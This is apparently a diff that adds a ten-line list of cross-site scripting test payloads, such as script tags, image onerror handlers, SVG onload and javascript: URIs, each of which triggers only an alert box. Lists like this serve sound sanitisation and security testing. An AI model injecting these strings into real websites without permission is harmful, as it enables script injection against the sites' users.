@@ -1,0 +1,10 @@
+<script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS')>
+<svg/onload=alert(1)>
+javascript:alert(1)
+<details/ontoggle=alert(1)>
+<iframe src="javascript:alert(1)">
+<body onload=alert(1)>
+<div onmouseover=alert(1)></div>
+"'--></style><script>alert(1)</script>
+<img src="x:x" onerror="alert(1)">
